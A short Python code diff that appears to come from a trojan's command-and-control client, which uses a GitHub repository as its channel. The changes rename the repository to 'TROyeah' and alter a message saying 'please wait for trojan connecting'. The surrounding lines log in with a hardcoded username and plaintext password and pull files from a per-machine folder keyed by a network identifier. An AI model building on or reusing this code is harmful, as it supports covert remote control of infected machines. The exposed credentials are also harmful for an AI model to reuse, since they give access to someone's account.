@@ -10,7 +10,7 @@ from github3 import *
 def connect_to_github():
     gh = login(username="OXVyeah", password="heiya233")
     #print(gh)
-    repo = gh.repository("OXVyeah", "yeah")
+    repo = gh.repository("OXVyeah", "TROyeah")
     #print(repo)
     branch = repo.branch("master")
     return gh, repo, branch
@@ -27,7 +27,7 @@ def downloadFilesFromGit(filename,rep):
 	m=network()
 	if rep.contents("data/"+str(m)+"/"+filename) == None :
 #	init "mac"
-		print "dont have such file... please wait for trojan connecting..."
+		print "dont have "+filename+"... please wait for trojan connecting..."
 		return "error"
 
 	con = rep.contents("data/"+str(m)+"/"+filename)
